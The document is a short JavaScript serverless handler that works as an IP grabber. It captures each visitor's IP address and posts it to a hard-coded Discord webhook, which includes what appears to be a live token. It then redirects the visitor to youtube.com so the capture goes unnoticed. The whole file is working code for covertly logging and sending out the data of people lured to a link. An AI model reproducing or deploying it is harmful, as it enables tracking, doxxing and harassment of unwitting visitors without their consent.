const axios = require("axios");

export default function handler(req, res) {
  const ipAddress =
    req.headers["x-forwarded-for"] || req.connection.remoteAddress;

  // Your Discord webhook URL
  const discordWebhookUrl = "https://discord.com/api/webhooks/1311415884891291809/0tHSM1M2TifTbnfKRjzCJyZxK22CvrRYvSRiE2Ddr7tsnjQQWHCEaXY12KR4gLaNL757"; 

  // The message you want to send to the webhook
  const message = {
    content: `IP Address: ${ipAddress}`,
  };

  // Send the IP address to the Discord webhook
  axios
    .post(discordWebhookUrl, message)
    .then(() => {
      // Redirect to the target URL
      const redirectUrl = "https://youtube.com"; // Replace with your target URL
      res.writeHead(302, { Location: redirectUrl });
      res.end();
    })
    .catch((error) => {
      console.error("Error sending to Discord webhook:", error);
      res.status(500).send("Internal Server Error");
    });
}
